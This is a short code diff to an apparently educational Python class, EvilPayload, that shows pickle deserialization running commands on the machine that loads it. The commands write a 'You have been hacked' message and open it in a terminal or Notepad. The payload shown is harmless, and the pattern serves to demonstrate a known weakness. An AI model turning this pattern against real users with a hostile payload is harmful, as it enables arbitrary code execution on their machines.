@@ -31,15 +31,14 @@ class EvilPayload:
         """
         Запустим на машине клиента безобидный Notepad (или другой редактор)
         """
-
-        os.system("echo 'You have been hacked by Evil Pickle!!!' > evil_msg.txt")
-
         if platform.system() == 'Linux':
+            os.system("echo \"input('You have been hacked by Evil Pickle!!!')\" > evil_msg.py")
             python_path = sys.executable
             base_path = os.path.dirname(os.path.abspath(__file__))
-            file_full_path = f"{python_path} {base_path}/run_evil_msg_for_ubuntu.py"
+            file_full_path = f"{python_path} {base_path}/evil_msg.py"
             return subprocess.Popen, (("gnome-terminal", "--", "bash", "-c", file_full_path),)
 
+        os.system("echo 'You have been hacked by Evil Pickle!!!' > evil_msg.txt")
         return subprocess.Popen, (('notepad', 'evil_msg.txt'),)
  
 
